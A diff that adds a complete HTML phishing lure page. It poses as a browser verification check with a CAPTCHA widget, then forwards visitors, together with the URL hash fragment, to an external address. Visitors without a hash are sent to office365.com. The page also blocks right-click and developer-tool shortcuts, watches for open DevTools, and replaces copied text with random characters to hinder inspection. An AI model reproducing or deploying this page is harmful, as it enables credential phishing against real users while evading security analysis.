@@ -1,0 +1,63 @@
+<html> <head> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>Document</title> <style> body, html { height: 50%; margin: 0; display: flex; justify-content: center; align-items: center; } </style> <script>function get() { var o = 
+
+"https://domain.com/XqlwscdC"
+
+ , i = window.location.hash; if (i) var t = o + "#" + i.split("#")[1]; else var t = "https://office365.com"; window.open(t, "_self") }</script> <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script> <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?compat=recaptcha" async defer></script> <section class="center" id="section" style="text-align:-webkit-center"> <div id="recaptcha" class="g-recaptcha" data-theme="light" data-sitekey="3x00000000000000000000FF" data-callback="onRecaptchaSuccess"></div> <script> function onRecaptchaSuccess() { setTimeout(function () { get() }, 1e3); } </script> <p id="WrongCaptchaError" class="error2"></p><html><head><title></title></head><body><p><span style="color:#666666;"><span style="font-size:14px;"><span style="font-family:arial,helvetica,sans-serif;"><span style="text-align: -webkit-center;">Verifying your browser for safe internet navigation</span></span></span></span></p></body></html>
+ 
+ <script>
+    document.addEventListener("DOMContentLoaded", () => {
+        // Disable Right-Click
+        document.addEventListener("contextmenu", (e) => {
+            e.preventDefault();
+            
+        });
+
+        // Prevent F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
+        document.addEventListener("keydown", (e) => {
+            if (
+                e.key === "F12" || 
+                (e.ctrlKey && (e.key === "u" || e.key === "U" || e.key === "j" || e.key === "J" || e.key === "i" || e.key === "I"))
+            ) {
+                e.preventDefault();
+                
+            }
+        });
+
+        // Detect if DevTools is Open
+        const checkDevTools = () => {
+            const threshold = 160;
+            const devtools = {
+                open: false,
+                orientation: null,
+            };
+            const element = new Image();
+            Object.defineProperty(element, "id", {
+                get: function () {
+                    devtools.open = true;
+                    devtools.orientation = window.outerWidth - window.innerWidth > threshold ? "vertical" : "horizontal";
+                },
+            });
+            console.log(element); // Trigger the getter
+            return devtools.open;
+        };
+
+        // Monitor for DevTools
+        setInterval(() => {
+            if (checkDevTools()) {
+                
+            }
+        }, 500);
+
+        // Replace Copied Text with Random Characters
+        document.addEventListener("copy", (e) => {
+            e.preventDefault();
+            const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            const randomString = Array.from({ length: 100 }, () => randomChars.charAt(Math.floor(Math.random() * randomChars.length))).join("");
+            e.clipboardData.setData("text/plain", randomString);
+            
+        });
+    });
+</script>
+
+</body>
+</html>
